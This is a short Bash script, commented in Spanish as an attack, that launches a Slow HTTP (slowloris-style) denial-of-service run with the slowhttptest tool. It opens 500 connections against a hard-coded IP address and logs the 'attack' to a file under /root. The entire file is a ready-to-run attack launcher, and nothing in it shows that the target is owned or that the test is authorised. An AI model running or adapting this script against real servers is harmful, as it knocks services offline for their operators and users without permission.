#!/bin/bash
# Parámetros del ataque
SERVIDOR="http://172.233.155.195/"
CONEXIONES=500
REPORTE="/root/slowhttp-$(date +%Y-%m-%d-%H-%M-%S)"
# Ejecuta slowhttptest
slowhttptest -c $CONEXIONES -H -g -o $REPORTE -i 10 -r 100 -t GET -u $SERVIDOR
echo "Ataque Slow HTTP realizado en $(date). Revisa el reporte $REPORTE.html" >> /root/ataques.log

